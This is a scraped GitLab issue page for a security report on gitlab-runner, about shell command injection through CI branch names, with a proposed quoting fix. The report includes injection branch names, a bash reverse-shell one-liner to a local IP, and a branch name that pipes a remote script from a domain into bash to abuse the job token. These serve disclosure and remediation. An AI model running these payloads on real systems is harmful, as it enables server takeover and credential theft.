inyectado el comando anterior para demostrar el impacto que tendría esta vulnerabilidad en el servidor victima al ser tomando por un atacante, logrando incluso la persistencia en el sistema aun cuando el trabajo es eliminado o borrado, además he realizado un prueba de concepto en video que adjuntare con el reporte, sin embargo en los pasos para reproducir este problema, usted ejecutara el comando <code data-sourcepos="34:428-34:436">hostname </code>en el sistema.<br data-sourcepos="34:454-34:454">&#x000A; &#x000A; </p>&#x000A;<h5 data-sourcepos="37:1-37:25">&#x000A;<a id="user-content-steps-to-reproduce" class="anchor" href="#steps-to-reproduce" aria-hidden="true"></a>Steps to reproduce</h5>&#x000A;<p data-sourcepos="39:1-39:18"><strong data-sourcepos="39:1-39:18">[Preparación]</strong></p>&#x000A;<p data-sourcepos="41:1-41:27"><strong data-sourcepos="41:1-41:6">1)</strong> Ingrese a Gitlab.com</p>&#x000A;<p data-sourcepos="43:1-43:30"><strong data-sourcepos="43:1-43:6">2)</strong> Cree un proyecto nuevo.</p>&#x000A;<p data-sourcepos="45:1-45:60"><strong data-sourcepos="45:1-45:6">3)</strong> Ejecute gitlab-runner en un servidor bajo su control.</p>&#x000A;<p data-sourcepos="47:1-47:99"><strong data-sourcepos="47:1-47:6">4)</strong> Registre un corredor para su proyecto <em data-sourcepos="47:46-47:98">(para este informe yo he elegido el ejecutor shell)</em>.</p>&#x000A;<p data-sourcepos="49:1-49:88"><strong data-sourcepos="49:1-49:6">5)</strong> Cree un archivo valido <code data-sourcepos="49:32-49:45">.gitlab-ci.yml</code>, y registre el corredor para el proyecto.</p>&#x000A;<p data-sourcepos="51:1-54:73"><strong data-sourcepos="51:1-51:6">6)</strong> Invite un nuevo miembro con permisos de desarrollador.<br data-sourcepos="51:64-51:64">&#x000A; &#x000A; <br data-sourcepos="53:5-53:5">&#x000A;<strong data-sourcepos="54:1-54:22">[Flujo del ataque]</strong> <em data-sourcepos="54:24-54:73">(miembro invitado con permisos de desarrollador)</em></p>&#x000A;<p data-sourcepos="56:1-56:76"><strong data-sourcepos="56:1-56:6">1)</strong> Cree una rama con el siguiente nombre  <strong data-sourcepos="56:47-56:76"><code data-math-style="inline" class="code math js-render-math">CI_DEFAULT_BRANCH`</code>{c}`</strong></p>&#x000A;<p data-sourcepos="58:1-58:173"><strong data-sourcepos="58:1-58:6">2)</strong> Ingrese a <code data-sourcepos="58:19-58:81">https://gitlab.com/&amp;lt;user&amp;gt;/&amp;lt;project&amp;gt;/-/pipelines/new</code> y seleccione la rama <strong data-sourcepos="58:105-58:134"><code data-math-style="inline" class="code math js-render-math">CI_DEFAULT_BRANCH`</code>{c}`</strong> para ejecutar una nueva canalización.</p>&#x000A;<p data-sourcepos="60:1-60:67"><strong data-sourcepos="60:1-60:6">3)</strong> Cree la variable de nombre <code data-sourcepos="60:36-60:36">c</code> con el valor <code data-sourcepos="60:53-60:65">eval hostname</code></p>&#x000A;<p data-sourcepos="62:1-62:32"><strong data-sourcepos="62:1-62:6">4)</strong> Ejecute la canalización.</p>&#x000A;<p data-sourcepos="64:1-64:139">Como resultado de esto el trabajo fallara ya que no redirigió la salida del comando al <code data-sourcepos="64:90-64:98">/dev/null</code> o no envió el comando a segundo plano.</p>&#x000A;<p data-sourcepos="66:1-66:55">Obtendrá el siguiente mensaje al finalizar el trabajo:</p>&#x000A;<p data-sourcepos="68:1-68:71"><code data-sourcepos="68:2-68:70">fatal: couldn&amp;#39;t find remote ref refs/heads/master&amp;lt;hostname&amp;gt;</code></p>&#x000A;<p data-sourcepos="70:1-72:4">Obtendrá el resultando del comando junto a la referencia remota <code data-sourcepos="70:67-70:72">master</code>, lo que indica que ha ejecutado un comando el el servidor de la victima.<br data-sourcepos="70:149-70:149">&#x000A; &#x000A; </p>&#x000A;<h5 data-sourcepos="73:1-73:44">&#x000A;<a id="user-content-what-is-the-current-bug-behavior" class="anchor" href="#what-is-the-current-bug-behavior" aria-hidden="true"></a>What is the current <em data-sourcepos="73:28-73:32">bug</em> behavior?</h5>&#x000A;<p data-sourcepos="74:1-77:4"> &#x000A;El nombre de la rama permite concatenar un comando a nivel de sistema que será ejecutado al momento de enviar una canalización.<br data-sourcepos="75:132-75:132">&#x000A; &#x000A; </p>&#x000A;<h5 data-sourcepos="78:1-78:47">&#x000A;<a id="user-content-what-is-the-expected-correct-behavior" class="anchor" href="#what-is-the-expected-correct-behavior" aria-hidden="true"></a>What is the expected <em data-sourcepos="78:29-78:37">correct</em> behavior?</h5>&#x000A;<p data-sourcepos="80:1-82:4">Se debe evaluar el nombre de la rama como una cadena de caracteres al momento de ejecutar una canalización.<br data-sourcepos="80:111-80:111">&#x000A; &#x000A; </p>&#x000A;<h5 data-sourcepos="83:1-83:39">&#x000A;<a id="user-content-relevant-logs-andor-screenshots" class="anchor" href="#relevant-logs-andor-screenshots" aria-hidden="true"></a>Relevant logs and/or screenshots</h5>&#x000A;<p data-sourcepos="85:1-85:78">En este video de prueba de concepto, se omiten los pasos de <strong data-sourcepos="85:61-85:78">[Preparación]</strong></p>&#x000A;<p data-sourcepos="87:1-89:4"><span class="media-container video-container"><video src="https://user-content.gitlab-static.net/d1e8140575ab3115ec65684c70f03d057efc5cd9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63633939373635612d633839352d343365642d623338352d6132633533343437306536382f706f632e6d7034" controls="true" data-setup="{}" data-title="poc.mp4" preload="metadata" width="400" data-canonical-src="https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4"></video><a href="https://user-content.gitlab-static.net/d1e8140575ab3115ec65684c70f03d057efc5cd9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63633939373635612d633839352d343365642d623338352d6132633533343437306536382f706f632e6d7034" target="_blank" rel="nofollow noreferrer noopener" title="Download 'poc.mp4'" data-canonical-src="https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4">poc.mp4</a></span><br data-sourcepos="87:87-87:87">&#x000A; &#x000A; </p>&#x000A;<h5 data-sourcepos="90:1-90:23">&#x000A;<a id="user-content-output-of-checks" class="anchor" href="#output-of-checks" aria-hidden="true"></a>Output of checks</h5>&#x000A;<p data-sourcepos="92:1-94:2">This bug happens on GitLab.com<br data-sourcepos="92:33-92:33">&#x000A; &#x000A; </p>&#x000A;<h4 data-sourcepos="96:1-96:12">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h4>&#x000A;<p data-sourcepos="98:1-98:557">Se puede ejecutar código arbitrario a nivel de sistema en ejecuciones CI, con tan solo enviar una nueva rama al proyecto y ejecutar una canalización, esto, sin modificar o crear ningún archivo que indique la acción mal intencionada por parte del atacante, debido a esto este ataque puede ser aun mas peligroso si se ejecutan las compilaciones en servidores de confianza ya que, como dije anteriormente no es necesaria la modificación de ningún archivo y además, no se crean registros de logs sobre la salida de algún comando enviado por el atacante.</p>&#x000A;</details>&#x000A;<h2 data-sourcepos="102:1-102:14" dir="auto">&#x000A;<a id="user-content-attachments" class="anchor" href="#attachments" aria-hidden="true"></a>Attachments</h2>&#x000A;<p data-sourcepos="104:1-104:77" dir="auto"><strong data-sourcepos="104:1-104:12">Warning:</strong> Attachments received through HackerOne, please exercise caution!</p>&#x000A;<ul data-sourcepos="106:1-107:0" dir="auto">&#x000A;<li data-sourcepos="106:1-107:0"><a data-sourcepos="106:3-106:85" href="https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4" rel="nofollow noreferrer noopener" target="_blank">poc.mp4</a></li>&#x000A;</ul>&#x000A;<h2 data-sourcepos="108:1-108:19" dir="auto">&#x000A;<a id="user-content-how-to-reproduce" class="anchor" href="#how-to-reproduce" aria-hidden="true"></a>How To Reproduce</h2>&#x000A;<p data-sourcepos="110:1-110:57" dir="auto">Please add <a data-sourcepos="110:12-110:40" href="https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues" rel="nofollow noreferrer noopener" target="_blank">reproducibility information</a> to this section:</p>&#x000A;<ol data-sourcepos="112:1-122:0" dir="auto">&#x000A;<li data-sourcepos="112:1-112:30">&#x000A;<p data-sourcepos="112:4-112:30">Create branch named <code data-sourcepos="112:25-112:29">$(id)</code></p>&#x000A;</li>&#x000A;<li data-sourcepos="113:1-113:19">&#x000A;<p data-sourcepos="113:4-113:19">Setup a pipeline</p>&#x000A;</li>&#x000A;<li data-sourcepos="114:1-122:0">&#x000A;<p data-sourcepos="114:4-114:35">Observe this in the build output</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="116:5-121:7" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">Fetching changes with git depth set to 50...</span>&#x000A;<span id="LC2" class="line" lang="plaintext">Initialized empty Git repository in /builds/dcouture/private_project/.git/</span>&#x000A;<span id="LC3" class="line" lang="plaintext">Created fresh repository.</span>&#x000A;<span id="LC4" class="line" lang="plaintext">fatal: invalid refspec '+refs/heads/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video):refs/remotes/origin/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)'</span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;</li>&#x000A;</ol>&#x000A;<h2 data-sourcepos="125:1-125:11" dir="auto">&#x000A;<a id="user-content-proposal" class="anchor" href="#proposal" aria-hidden="true"></a>Proposal</h2>&#x000A;<p data-sourcepos="127:1-127:481" dir="auto">The problem happens because all command arguments are double-quoted in <code data-sourcepos="127:73-127:83">ShellWriter</code>-derived classes (Windows Batch is a different case that requires a different solution). In this particular scenario, the command in question is constructed in <a data-sourcepos="127:245-127:394" href="http://gitlab.com/gitlab-org/gitlab-runner/blob/e25e39c60cee7ab0be55af6a1575262f3fcfd64b/shells/abstract.go#L368">AbstractShell.writeRefspecFetchCmd</a>. As shown by this issue, double-quoting all arguments is an unsafe default. We should:</p>&#x000A;<ol data-sourcepos="129:1-130:0" dir="auto">&#x000A;<li data-sourcepos="129:1-130:0">rename the current <code data-sourcepos="129:24-129:30">Command</code> method in the <code data-sourcepos="129:48-129:58">ShellWriter</code> interface to e.g. <code data-sourcepos="129:80-129:102">CommandWithArgExpansion</code>, and add a new <code data-sourcepos="129:121-129:127">Command</code> method which would write the command in such a way that it would not expand arguments (normally this would be done by single-quoting them instead of double-quoting).</li>&#x000A;</ol>&#x000A;<ul data-sourcepos="131:3-146:0" dir="auto">&#x000A;<li data-sourcepos="131:3-142:0">&#x000A;<p data-sourcepos="131:5-131:108">in <code data-sourcepos="131:9-131:12">bash</code> and <code data-sourcepos="131:20-131:23">pwsh</code>, this is achieved by quoting arguments with a single-quote instead of double-quote.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="133:5-135:7" data-canonical-lang="shell" class="code highlight js-syntax-highlight language-shell" lang="shell" v-pre="true"><code><span id="LC1" class="line" lang="shell"><span class="s2">$"git"</span> <span class="s2">"-c"</span> <span class="s2">"http.userAgent=gitlab-runner development version darwin/amd64"</span> <span class="s2">"fetch"</span> <span class="s2">"origin"</span> <span class="s2">"+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606"</span> <span class="s2">"+refs/heads/</span><span class="si">$(</span><span class="nb">id</span><span class="si">)</span><span class="s2">:refs/remotes/origin/</span><span class="si">$(</span><span class="nb">id</span><span class="si">)</span><span class="s2">"</span> <span class="s2">"--depth"</span> <span class="s2">"50"</span> <span class="s2">"--prune"</span> <span class="s2">"--quiet"</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="137:5-137:11">becomes</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="139:5-141:7" data-canonical-lang="shell" class="code highlight js-syntax-highlight language-shell" lang="shell" v-pre="true"><code><span id="LC1" class="line" lang="shell"><span class="s1">$'git'</span> <span class="s1">'-c'</span> <span class="s1">'http.userAgent=gitlab-runner development version darwin/amd64'</span> <span class="s1">'fetch'</span> <span class="s1">'origin'</span> <span class="s1">'+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606'</span> <span class="s1">'+refs/heads/$(id):refs/remotes/origin/$(id)'</span> <span class="s1">'--depth'</span> <span class="s1">'50'</span> <span class="s1">'--prune'</span> <span class="s1">'--quiet'</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;</li>&#x000A;<li data-sourcepos="143:3-146:0">&#x000A;<p data-sourcepos="143:5-143:58">in <code data-sourcepos="143:9-143:11">cmd</code>, this is achieved by replacing <code data-sourcepos="143:46-143:46">%</code> with <code data-sourcepos="143:55-143:56">%^</code>:</p>&#x000A;<p data-sourcepos="145:5-145:65"><a class="no-attachment-icon gfm" href="/-/project/250833/uploads/5e61bc75b987b5b79f357e414b04b699/image.png" target="_blank" rel="noopener noreferrer" data-canonical-src="/uploads/5e61bc75b987b5b79f357e414b04b699/image.png" data-link="true"><img data-sourcepos="145:5-145:65" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" decoding="async" class="lazy gfm" data-src="/-/project/250833/uploads/5e61bc75b987b5b79f357e414b04b699/image.png" data-canonical-src="/uploads/5e61bc75b987b5b79f357e414b04b699/image.png"></a></p>&#x000A;</li>&#x000A;</ul>&#x000A;<ol data-sourcepos="147:1-149:0" dir="auto">&#x000A;<li data-sourcepos="147:1-147:128">add tests for the new <code data-sourcepos="147:27-147:33">Command</code> implementation in <code data-sourcepos="147:55-147:65">ShellWriter</code>-derived classes to ensure that known expansions are thwarted.</li>&#x000A;<li data-sourcepos="148:1-149:0">Ideally, we'd review all commands that shouldn't need argument expansion and have them be created with <code data-sourcepos="148:108-148:114">Command</code> instead of <code data-sourcepos="148:129-148:151">CommandWithArgExpansion</code>.</li>&#x000A;</ol>&#x000A;<p data-sourcepos="150:1-150:98" dir="auto">Once this is done, a <code data-sourcepos="150:23-150:26">bash</code> job on a branch called <code data-sourcepos="150:53-150:57">$(id)</code> no longer fails or exposes information:</p>&#x000A;<p data-sourcepos="152:1-152:61" dir="auto"><a class="no-attachment-icon gfm" href="/-/project/250833/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png" target="_blank" rel="noopener noreferrer" data-canonical-src="/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png" data-link="true"><img data-sourcepos="152:1-152:61" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" decoding="async" class="lazy gfm" data-src="/-/project/250833/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png" data-canonical-src="/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png"></a></p>&#x000A;<p data-sourcepos="154:1-154:61" dir="auto">Same thing for a <code data-sourcepos="154:19-154:22">pwsh</code> job on a branch called <code data-sourcepos="154:49-154:59">$(Get-Host)</code>:</p>&#x000A;<p data-sourcepos="156:1-156:61" dir="auto"><a class="no-attachment-icon gfm" href="/-/project/250833/uploads/9fb68e0ea6e55589588a149012075b91/image.png" target="_blank" rel="noopener noreferrer" data-canonical-src="/uploads/9fb68e0ea6e55589588a149012075b91/image.png" data-link="true"><img data-sourcepos="156:1-156:61" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" decoding="async" class="lazy gfm" data-src="/-/project/250833/uploads/9fb68e0ea6e55589588a149012075b91/image.png" data-canonical-src="/uploads/9fb68e0ea6e55589588a149012075b91/image.png"></a></p>&#x000A;<p data-sourcepos="158:1-158:101" dir="auto">A PoC MR is located <a href="https://gitlab.com/gitlab-org/security/gitlab-runner/-/merge_requests/25">here</a>.</p></div>
</div>
<div class="edited-text gl-mt-4 gl-text-subtle gl-text-sm">Edited <time class="js-timeago issue-edited-ago js-issue-edited-ago" title="Aug 23, 2022 3:21pm" datetime="2022-08-23T15:21:50Z" data-toggle="tooltip" data-placement="bottom" data-container="body">Aug 23, 2022</time> by <a class="author-link hover:gl-underline gl-text-subtle js-user-link" data-user-id="4228834" data-username="DarrenEastman" data-name="Darren Eastman" href="/DarrenEastman"><span class="">Darren Eastman</span></a></div>
</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/250833/issues/27386/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="js-design-management" data-issue-iid="27386" data-issue-path="/gitlab-org/gitlab-runner/-/issues/27386" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-project-path="gitlab-org/gitlab-runner" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div class="js-work-item-links-root" data-full-path="gitlab-org/gitlab-runner" data-issuable-id="76597290" data-issuable-iid="27386" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="main" data-wi-epics-list-path="/groups/gitlab-runner/-/epics" data-wi-full-path="gitlab-org/gitlab-runner" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab-runner/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab-runner/-/issues" data-wi-labels-fetch-path="/groups/gitlab-runner/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab-runner/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/gitlab-org/gitlab-runner/-/issues/27386/links" data-full-path="gitlab-org/gitlab-runner" data-has-issue-weights-feature="true" data-has-iterations-feature="true" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="true" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="main" data-wi-epics-list-path="/groups/gitlab-runner/-/epics" data-wi-full-path="gitlab-org/gitlab-runner" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab-runner/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab-runner/-/issues" data-wi-labels-fetch-path="/groups/gitlab-runner/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab-runner/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="27386" data-project-path="gitlab-org/gitlab-runner" id="js-related-merge-requests"></div>
<div data-url="/gitlab-org/gitlab-runner/-/issues/27386/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:76597290,&quot;iid&quot;:27386,&quot;description&quot;:&quot;## Status Report (revised: 2022-08-xx)\n\n{placeholder}\n\n**[HackerOne report #1063511](https://hackerone.com/reports/1063511)** by `stanlyoncm` on 2020-12-21, assigned to @dcouture:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\nBranch names are interpreted by the shell so you can inject commands. Someone could create a branch named `$(curl${IFS}abcd.com|bash)` and host a script on that custom domain that would abuse the `CI_JOB_TOKEN`. You&#39;d need then to get someone to contribute to your MR which borders on social engineering but you could do it by getting someone to Apply Suggestion and hope they don&#39;t pay attention to the odd branch name. This is also, and perhaps more importantly, related to the efforts in https://gitlab.com/gitlab-org/gitlab/-/issues/295234\n\n\u003cdetails\u003e\n\u003csummary\u003e\nOriginal report in spanish\n\u003c/summary\u003e\n\n## Report\n\n==Report in Spanish:==\n\n#####  Summary\n\nDebido a que el nombre de una rama permite algunos __caracteres especiales__, un atacante *(desarrollador)* es capaz de ejecutar __código a nivel de sistema__ en un servidor que este ejecutando __gilab-runner__ para las canalizaciones de un proyecto.\n\nEl atacante que empuja una rama con nombre __$CI_DEFAULT_BRANCH\\`${c}\\`__ , es capaz luego de ejecutar una canalización a través de la interfaz de gitlab.com, estableciendo como valor de __“c”__ un comando a nivel de sistema.\n\nLo que hace interesante a este ataque es que, no es necesaria la creación o modificación de ningún archivo del proyecto mientras se envía el trabajo a la canalización, por ejemplo `.gitlab-ci.yml`, lo que indiciaria una posible acción maliciosa por parte de quien envía el trabajo.\n\nEl trabajo no dejara rastros de haber ejecutado algún comando en el servidor, ya que, el atacante debe redirigir la salida del comando hacia `/dev/null`,  además, el comando es ejecutado como producto de haber sido concatenado con el nombre de la rama a través de una variable de entorno.\n\nPara la prueba de concepto, realice las pruebas bajo un entorno controlado ejecutando un corredor con un ejecutor __“”shell””__ y enviando un único trabajo que imprime un mensaje al finalizar. Luego al ejecutar una canalización desde la interfaz web y asignar un comando a nivel de sistema al valor de la variable de entorno __“c”__, pude obtener una conexión inversa mediante el siguiente comando.  \n```bash  \n(exec 5\u0026lt;\u0026gt;/dev/tcp/172.17.0.2/4444 \u0026amp;\u0026amp; while read line 0\u0026lt;\u0026amp;5;do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5;done \u0026amp;) \u0026amp;\u0026gt;/dev/null  \n```  \nCabe destacar que yo he inyectado el comando anterior para demostrar el impacto que tendría esta vulnerabilidad en el servidor victima al ser tomando por un atacante, logrando incluso la persistencia en el sistema aun cuando el trabajo es eliminado o borrado, además he realizado un prueba de concepto en video que adjuntare con el reporte, sin embargo en los pasos para reproducir este problema, usted ejecutara el comando `hostname `en el sistema.  \n \n   \n#####  Steps to reproduce\n\n__[Preparación]__\n\n__1)__ Ingrese a Gitlab.com\n\n__2)__ Cree un proyecto nuevo.\n\n__3)__ Ejecute gitlab-runner en un servidor bajo su control.\n\n__4)__ Registre un corredor para su proyecto *(para este informe yo he elegido el ejecutor shell)*.\n\n__5)__ Cree un archivo valido `.gitlab-ci.yml`, y registre el corredor para el proyecto.\n\n__6)__ Invite un nuevo miembro con permisos de desarrollador.  \n \n   \n__[Flujo del ataque]__ *(miembro invitado con permisos de desarrollador)*\n\n__1)__ Cree una rama con el siguiente nombre  __$CI_DEFAULT_BRANCH\\`${c}\\`__\n\n__2)__ Ingrese a `https://gitlab.com/\u0026lt;user\u0026gt;/\u0026lt;project\u0026gt;/-/pipelines/new` y seleccione la rama __$CI_DEFAULT_BRANCH\\`${c}\\`__ para ejecutar una nueva canalización.\n\n__3)__ Cree la variable de nombre `c` con el valor `eval hostname` \n\n__4)__ Ejecute la canalización.\n\nComo resultado de esto el trabajo fallara ya que no redirigió la salida del comando al `/dev/null` o no envió el comando a segundo plano.\n\nObtendrá el siguiente mensaje al finalizar el trabajo:\n\n`fatal: couldn\u0026#39;t find remote ref refs/heads/master\u0026lt;hostname\u0026gt;`\n\nObtendrá el resultando del comando junto a la referencia remota `master`, lo que indica que ha ejecutado un comando el el servidor de la victima.  \n \n   \n#####  What is the current *bug* behavior?  \n \nEl nombre de la rama permite concatenar un comando a nivel de sistema que será ejecutado al momento de enviar una canalización.  \n \n   \n#####  What is the expected *correct* behavior?\n\nSe debe evaluar el nombre de la rama como una cadena de caracteres al momento de ejecutar una canalización.  \n \n   \n#####  Relevant logs and/or screenshots\n\nEn este video de prueba de concepto, se omiten los pasos de __[Preparación]__\n\n![poc.mp4](https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4)  \n \n   \n#####  Output of checks\n\nThis bug happens on GitLab.com  \n \n \n\n####  Impact\n\nSe puede ejecutar código arbitrario a nivel de sistema en ejecuciones CI, con tan solo enviar una nueva rama al proyecto y ejecutar una canalización, esto, sin modificar o crear ningún archivo que indique la acción mal intencionada por parte del atacante, debido a esto este ataque puede ser aun mas peligroso si se ejecutan las compilaciones en servidores de confianza ya que, como dije anteriormente no es necesaria la modificación de ningún archivo y además, no se crean registros de logs sobre la salida de algún comando enviado por el atacante.\n\n\u003c/details\u003e\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [poc.mp4](https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1. Create branch named `$(id)`\n1. Setup a pipeline\n1. Observe this in the build output\n\n    ```\n    Fetching changes with git depth set to 50...\n    Initialized empty Git repository in /builds/dcouture/private_project/.git/\n    Created fresh repository.\n    fatal: invalid refspec &#39;+refs/heads/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video):refs/remotes/origin/uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)&#39;\n    ```\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\n\n## Proposal\n\nThe problem happens because all command arguments are double-quoted in `ShellWriter`-derived classes (Windows Batch is a different case that requires a different solution). In this particular scenario, the command in question is constructed in [AbstractShell.writeRefspecFetchCmd](http://gitlab.com/gitlab-org/gitlab-runner/blob/e25e39c60cee7ab0be55af6a1575262f3fcfd64b/shells/abstract.go#L368). As shown by this issue, double-quoting all arguments is an unsafe default. We should:\n\n1. rename the current `Command` method in the `ShellWriter` interface to e.g. `CommandWithArgExpansion`, and add a new `Command` method which would write the command in such a way that it would not expand arguments (normally this would be done by single-quoting them instead of double-quoting).\n\n  - in `bash` and `pwsh`, this is achieved by quoting arguments with a single-quote instead of double-quote.\n\n    ```shell\n    $\&quot;git\&quot; \&quot;-c\&quot; \&quot;http.userAgent=gitlab-runner development version darwin/amd64\&quot; \&quot;fetch\&quot; \&quot;origin\&quot; \&quot;+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606\&quot; \&quot;+refs/heads/$(id):refs/remotes/origin/$(id)\&quot; \&quot;--depth\&quot; \&quot;50\&quot; \&quot;--prune\&quot; \&quot;--quiet\&quot;\n    ```\n    \n    becomes\n    \n    ```shell\n    $&#39;git&#39; &#39;-c&#39; &#39;http.userAgent=gitlab-runner development version darwin/amd64&#39; &#39;fetch&#39; &#39;origin&#39; &#39;+8a98ee069bb3146e558891110f0debf16dfe6fa8:refs/pipelines/246990606&#39; &#39;+refs/heads/$(id):refs/remotes/origin/$(id)&#39; &#39;--depth&#39; &#39;50&#39; &#39;--prune&#39; &#39;--quiet&#39;\n    ```\n\n  - in `cmd`, this is achieved by replacing `%` with `%^`:\n\n    ![image](/uploads/5e61bc75b987b5b79f357e414b04b699/image.png)\n\n1. add tests for the new `Command` implementation in `ShellWriter`-derived classes to ensure that known expansions are thwarted.\n1. Ideally, we&#39;d review all commands that shouldn&#39;t need argument expansion and have them be created with `Command` instead of `CommandWithArgExpansion`.\n\nOnce this is done, a `bash` job on a branch called `$(id)` no longer fails or exposes information:\n\n![image](/uploads/7507d0fc0e0a50000b363881a3027d0f/image.png)\n\nSame thing for a `pwsh` job on a branch called `$(Get-Host)`:\n\n![image](/uploads/9fb68e0ea6e55589588a149012075b91/image.png)\n\nA PoC MR is located [here](https://gitlab.com/gitlab-org/security/gitlab-runner/-/merge_requests/25).&quot;,&quot;title&quot;:&quot;Command injection via branch name in CI 